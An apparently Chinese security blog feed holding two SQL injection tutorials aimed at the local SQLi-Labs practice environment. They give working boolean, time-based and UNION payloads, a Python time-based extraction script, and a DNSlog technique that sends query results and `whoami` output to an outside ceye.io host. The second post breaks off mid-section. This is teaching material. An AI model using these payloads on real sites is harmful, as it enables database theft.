        <content type="html"><![CDATA[<p>本文学习SQL盲注，通过掌握布尔盲注、时间延迟盲注和DnsLog盲注三种盲注方法的原理，到利用Sqli-Labs模拟环境来实战。</p><a id="more"></a><h2 id="一、布尔盲注"><a href="#一、布尔盲注" class="headerlink" title="一、布尔盲注"></a>一、布尔盲注</h2><h4 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h4><blockquote><p>可以进行注入，但是不回显数据，只返回True与False。</p></blockquote><h4 id="布尔盲注典型代码"><a href="#布尔盲注典型代码" class="headerlink" title="布尔盲注典型代码"></a>布尔盲注典型代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; limit 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;True!!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Fasle!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="布尔盲注方法"><a href="#布尔盲注方法" class="headerlink" title="布尔盲注方法"></a>布尔盲注方法</h4><p>构造逻辑判断语句，判断信息真假</p><table><thead><tr><th align="center">序号</th><th>方法</th><th>说明</th></tr></thead><tbody><tr><td align="center">1</td><td>left()函数</td><td><code>left(str1,length)</code> 从左侧截取str的前b位</td></tr><tr><td align="center">2</td><td>regexp</td><td><code>select user() regexp &#39;^r&#39;</code> regexp为匹配root的正则表达式</td></tr><tr><td align="center">3</td><td>like</td><td><code>select user() like &#39;ro%&#39;</code> 使用like进行匹配</td></tr><tr><td align="center">4</td><td>substr()函数和ascii()函数</td><td><code>ascii(substr((select database(),1,1))=98</code> <code>substr(str,index,length)</code></td></tr><tr><td align="center">5</td><td>ord()函数和mid()函数</td><td><code>ord(mid((select user()),1,1))=114</code> <code>mid(str,index,length)</code></td></tr></tbody></table><p><strong>注：</strong> 在BurpSuite中可以使用intuder模块根据返回页面长度不同来判断。（利用BurpSuite工具将在后续文章中详解）</p><h4 id="实战-SQLi-Labs-Less-8"><a href="#实战-SQLi-Labs-Less-8" class="headerlink" title="实战 SQLi-Labs Less-8"></a>实战 SQLi-Labs Less-8</h4><ol><li>阅读源代码可知语句为True则返回<code>You are in ......</code>，False则不返回内容。</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v4qwgrj31fq0u0wrz.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v4qwgrj31fq0u0wrz.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322142910359"></p><ol start="2"><li>利用<code>left()</code>函数来测试数据库名称</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v5lc4vj31mk0byacf.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v5lc4vj31mk0byacf.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322143316493"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v7xhcmj31mc0bqtb4.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v7xhcmj31mc0bqtb4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322143340019"></p><ol start="3"><li>利用<code>left()</code>函数来查询数据表名称</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v484mrj31mk0dk41g.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v484mrj31mk0dk41g.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322153425413"></p><ol start="4"><li>利用<code>regexp</code>正则表达式来查询数据库名称</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v2q64yj31mi0ecjtj.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v2q64yj31mi0ecjtj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322211153300"></p><ol start="5"><li>利用<code>substr()</code>和<code>ascii()</code>函数来查询数据库名称</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v8xv2uj31mg0aitax.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v8xv2uj31mg0aitax.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322211554750"></p><h2 id="二、时间盲入"><a href="#二、时间盲入" class="headerlink" title="二、时间盲入"></a>二、时间盲入</h2><h4 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h4><blockquote><p>代码存在SQL注入漏洞，但是页面不会回显错误信息</p><p>语句执行后也不回显真假信息，不能通过页面的内容来判断</p><p>时间盲注：构造语句，通过页面响应的时长来判断信息</p></blockquote><h4 id="时间盲注代码"><a href="#时间盲注代码" class="headerlink" title="时间盲注代码"></a>时间盲注代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; limit 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h4><p>构造逻辑语句，通过条件语句进行判断，True则立即执行，False则延时执行。</p><p>核心语法：**<code>if(条件,0,sleep(3));</code>**</p><p>真实场景：<code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))--+</code></p><h4 id="实战-SQLi-Labs-Less-10"><a href="#实战-SQLi-Labs-Less-10" class="headerlink" title="实战 SQLi-Labs Less-10"></a>实战 SQLi-Labs Less-10</h4><ol><li>阅读源代码可知语句无论是True还是False都返回<code>You are in ......</code>。</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v2ceq6j310g0u0gw3.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v2ceq6j310g0u0gw3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322220114441"></p><ol start="2"><li>构造Payload实现时间盲注<code>http://127.0.0.1:8999/Less-10/?id=2“ and if(left(user(),1)= ’a’,0,sleep(3))--+</code>，通过响应时长来判断。</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v6i8t1j31mo0s2jx3.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v6i8t1j31mo0s2jx3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322221054373"></p><ol start="3"><li>构造Payload实现时间盲注<code>http://127.0.0.1:8999/Less-10/?id=2“ and if(left(user(),1)= ’r’,0,sleep(3))--+</code>（正确答案），通过响应时长来判断。</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v70quoj31mu0rkn2o.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v70quoj31mu0rkn2o.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200322221326336"></p><h4 id="用Python3编写时间盲注脚本"><a href="#用Python3编写时间盲注脚本" class="headerlink" title="用Python3编写时间盲注脚本"></a>用Python3编写时间盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># timeBlindSql.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#提供字符串转十六进制函数</span></span><br><span class="line"><span class="comment">#def strtoHex():</span></span><br><span class="line"><span class="comment">#    temp = str(binascii.b2a_hex(&#x27;security&#x27;.encode(&#x27;utf-8&#x27;)))</span></span><br><span class="line"><span class="comment">#    return &#x27;0x&#x27;+temp[2:len(temp)-1]</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8999/Less-10/?id=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库，不需做任何改动</span></span><br><span class="line">database = <span class="string">&#x27;select schema_name from information_schema.schemata&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据表，默认为当前数据库，若需改动则填写数据库的十六进制格式</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;select table_name from information_schema.tables where table_schema=database()&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取数据表，数据表的十六进制格式</span></span><br><span class="line">column = <span class="string">&#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result_total = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">          <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">&#x27;&quot; and if(ascii(substr((&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(1),1)--+&#x27;</span>.<span class="built_in">format</span>(table,num,i,j)</span><br><span class="line">            stime = time.time()</span><br><span class="line">            r = requests.get(url+payload)</span><br><span class="line">            etime = time.time()</span><br><span class="line">            <span class="keyword">if</span> etime - stime &gt;= <span class="number">1</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;result[&#123;&#125;]:&#x27;</span>.<span class="built_in">format</span>(num)+result)  </span><br><span class="line">    result_total += <span class="string">&#x27;&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(result)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">print(result_total) </span><br><span class="line">   </span><br></pre></td></tr></table></figure><h2 id="三、Dnslog盲注"><a href="#三、Dnslog盲注" class="headerlink" title="三、Dnslog盲注"></a>三、Dnslog盲注</h2><h4 id="Dnslog盲注原理"><a href="#Dnslog盲注原理" class="headerlink" title="Dnslog盲注原理"></a>Dnslog盲注原理</h4><blockquote><p>DnsLog：DNS Server中记录我们访问域名的信息。</p><p>语句执行后也不回显真假信息，不能通过页面的内容来判断。我们可以通过布尔或时间盲注来获取内容，但是整个过程效率很低，需要发送很多的请求进行判断，很可能会触发安全设备的防护。</p><p>DnsLog盲注：减少请求，直接回显数据。</p></blockquote><h4 id="Dnslog盲注典型代码"><a href="#Dnslog盲注典型代码" class="headerlink" title="Dnslog盲注典型代码"></a>Dnslog盲注典型代码</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id <span class="operator">=</span> $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line">if($row)&#123;</span><br><span class="line">  echo &quot;True!!!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &quot;Fasle!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Dnslog盲注方法"><a href="#Dnslog盲注方法" class="headerlink" title="Dnslog盲注方法"></a>Dnslog盲注方法</h4><p>DnsLog平台：<a href="http://ceye.io/">http://ceye.io/</a></p><ol><li>前往DnsLog平台注册登入后，平台会分配一个Identity</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v9afgtj322p0u0tdp.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v9afgtj322p0u0tdp.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200323170310463"></p><ol start="2"><li>进入命令行利用curl发起请求</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v62lzxj318e0323zu.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v62lzxj318e0323zu.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200323170444476"></p><ol start="3"><li>在ceye.io/records/dns即可查看到访问记录</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v7hrcaj31vq0mcwh2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v7hrcaj31vq0mcwh2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200323170636399"></p><ol start="4"><li>利用bash中``可执行命令的属性。设置curl请求：`whoami`.bygt3w.ceye.io</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd90v36v6bj31uc07uabi.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd90v36v6bj31uc07uabi.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200323171027652"></p><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。</p><p><strong>在MySQ LLOAD_FILE函数可以发起请求，使用DnsLog接收请求，获取数据。</strong></p><p><strong>核心语句：</strong><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,（select database()),&#39;.mysql.bygt3w.ceye.io\\abc&#39;))</code></p><p>通过SQL语句查询内容，作为请求的一部分，发送至DnsLog。</p><p>只需要对核心语句中<code>select database()</code>部分进行构造，就能实现<strong>有回显</strong>的SQL注入。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】二、SQL注入语法类型</title>
      <link href="2020/03/22/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/"/>
      <url>2020/03/22/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>本文学习SQL注入语法类型，主要介绍了两种注入语法，分别是UNION联合查询注入和报错注入，每一部分都会涉及到Sqli-Labs模拟实战环境。</p><a id="more"></a><h2 id="一、UNION查询注入"><a href="#一、UNION查询注入" class="headerlink" title="一、UNION查询注入"></a>一、UNION查询注入</h2><h4 id="1-1-UNION介绍"><a href="#1-1-UNION介绍" class="headerlink" title="1.1 UNION介绍"></a>1.1 UNION介绍</h4><blockquote><p>UNION操作符用于合并两个或多个SELECT语句的结果集。</p><p>注意：要与UNION前面的select语句拥有相同数量的列。</p></blockquote><h4 id="1-2-UNION注入应用场景"><a href="#1-2-UNION注入应用场景" class="headerlink" title="1.2 UNION注入应用场景"></a>1.2 UNION注入应用场景</h4><ol><li>只有最有一个select子句允许有order by</li><li>只有最有一个select子句允许有limit</li><li>查询字段数一样</li><li>注入点页面有回显</li></ol><h4 id="1-3-UNION注入过程"><a href="#1-3-UNION注入过程" class="headerlink" title="1.3 UNION注入过程"></a>1.3 UNION注入过程</h4><ol><li><code>order by</code>确定列数</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s777vlxj31ba0se4qr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s777vlxj31ba0se4qr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320113549844"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s7g7nflj312m0sykjm.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s7g7nflj312m0sykjm.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320113619571"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s7p921qj31560sqnpe.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s7p921qj31560sqnpe.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320113652427"></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s8vj0g9j31j805wqlt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s8vj0g9j31j805wqlt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320113729873"></p><p>因此可以确认该user表共有三列，便于后续union查询操作。</p><ol start="2"><li>观察页面返回， 选取可以显示数据的位置，进行下一步的注入</li></ol><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd9s9vehn4j31mk0dyju2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/00831rSTly1gd9s9vehn4j31mk0dyju2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320115406791"></p><ol start="3"><li>读库信息（详细解析请看第一章）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</span><br></pre></td></tr></table></figure></li><li>读表信息（详细解析请看第一章）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from%20information_schema.tables where table_schema&#x3D;&#39;security&#39;)--+</span><br></pre></td></tr></table></figure></li><li>读列信息（详细解析请看第一章）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)--+</span><br></pre></td></tr></table></figure></li><li>读数据信息（详细解析请看第一章）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(username) from security.users)--+</span><br><span class="line"># 或者</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:8999&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(username) from users--+</span><br></pre></td></tr></table></figure><h2 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h2></li></ol><h4 id="2-1-报错注入原理"><a href="#2-1-报错注入原理" class="headerlink" title="2.1 报错注入原理"></a>2.1 报错注入原理</h4><blockquote><p>构造Payload让信息通过错误提示回显出来</p><p>应用场景：</p><ol><li>查询不回显内容，会打印错误信息</li><li>UPDATE、INSRET等语句，会打印错误信息</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($row)&#123;</span><br><span class="line">echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/nizeyu/Library/Application%20Support/typora-user-images/image-20200320162115626.png" class="lazyload" data-srcset="/Users/nizeyu/Library/Application%20Support/typora-user-images/image-20200320162115626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200320162115626"></p><h4 id="2-2-报错注入实战"><a href="#2-2-报错注入实战" class="headerlink" title="2.2 报错注入实战"></a>2.2 